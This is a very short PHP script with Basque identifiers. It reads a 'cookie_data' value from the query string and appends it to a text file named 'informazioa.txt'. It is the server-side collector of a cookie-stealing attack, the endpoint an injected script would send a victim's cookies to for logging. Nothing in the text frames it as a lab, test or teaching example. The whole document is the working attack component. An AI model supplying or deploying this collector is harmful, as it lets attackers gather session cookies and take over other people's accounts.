<?php
    $datua= $_GET['cookie_data'];
    File_put_contents("informazioa.txt", $datua, FILE_APPEND);
?>

